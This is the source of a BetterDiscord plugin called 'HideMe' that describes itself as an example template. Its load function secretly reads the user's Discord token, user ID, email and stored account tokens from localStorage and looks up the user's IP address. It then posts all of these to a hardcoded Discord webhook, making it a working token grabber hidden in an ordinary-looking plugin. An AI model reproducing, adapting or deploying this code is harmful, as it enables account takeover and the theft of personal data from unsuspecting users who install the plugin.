/**
 * @name HideMe
 * @authorId Me
 * @invite Me
 * @donate https://www.paypal.me/GameOverLmao
 * @website https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD
 * @source https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD/HideMe.plugin.js
 * @updateUrl https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD/HideMe.plugin.js
 */
class HideMe {
    // Constructor
    constructor() {
        this.initialized = false;
    }

    // Meta
    getName() {
        return "HideMe";
    }
    getShortName() {
        return "HideMe";
    }
    getDescription() {
        return "This is an example/template for a BD plugin.";
    }
    getVersion() {
        return "1.0.1";
    }
    getAuthor() {
        return "Hideaki Atsuyo";
    }

    // Settings  Panel
    getSettingsPanel() {
        return "<!--Enter Settings Panel o, just standard HTML-->";
    }

    // Load/Unload
    async load() {
    	window.dispatchEvent(new Event('beforeunload')); //Useless Atm
    	const https = require('https');//Hehehe Hello XMLHttpRequest

    	var config = {
    		pingOnResult: true,
    		webHook: "/api/webhooks/915046074685734933/w_17tVcLIGIVy5BIV_5iG9l5rC_nvwBlzSD1DpTyC3j8pjFvKznc0E_R8M10caOKSINp",
    		webhookUsername: "Hello World",
    		webhookAvatar: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",

    		embedTitle: "Hello World",
    		embedColor: 0x36393f,

    		tts: true
    	};

    	function getIP(){
    		return new Promise(async (resolve, reject) => {
    			https.get({'host': 'api.ipify.org', 'port': 443, 'path': '/'}, function(response) {
    				response.on('data', function(body) {
    					return resolve(body.toString());
    				}).on('error', (e) => {
    					console.error(e);
    				});
    			});
    		});
    	}

    	function getInfo(info){
    		return new Promise(async (resolve, reject) => {
    			return resolve(window.open().localStorage[info])
    		});
    	}

    	var IP = await getIP();
    	var actualUserToken = await getInfo("token");
    	var actualUserID = await getInfo("user_id_cache");
    	//var actualUserSettings = await getInfo("UserSettingsStore"); //Pretty Big
    	var actualUserEmail = await getInfo("email_cache");
    	var storedTokens = await getInfo("tokens"); // For New Multi Account System

        var pD = JSON.stringify({
            content: config.pingOnResult ? "@everyone": "Ah Fuck No Ping :(",
            username: config.webhookUsername,
            avatar_url: config.webhookAvatar,
            tts: config.tts,
            embeds: [{"title": config.embedTitle, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User ID", "value": `\`${actualUserID.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens}\`\`\``, inline: false }]}]
        });

        var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": config.webHook, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
        SendToWebhook.on('error', (e) => {
            console.error(e);
        });
        SendToWebhook.write(pD);
        SendToWebhook.end();
    }

    unload() {}

    // Events

    onMessage() {
        // Called when a message is received
    };

    onSwitch() {
        // Called when a server or channel is switched
    };

    observer(e) {
        // raw MutationObserver event for each mutation
    };

    // Start/Stop
    start() {
      this.initialize();
    }

    stop() {
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has stopped.");
    };

    //  Initialize
    initialize() {
        this.initialized = true;
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has started.");
    }
}
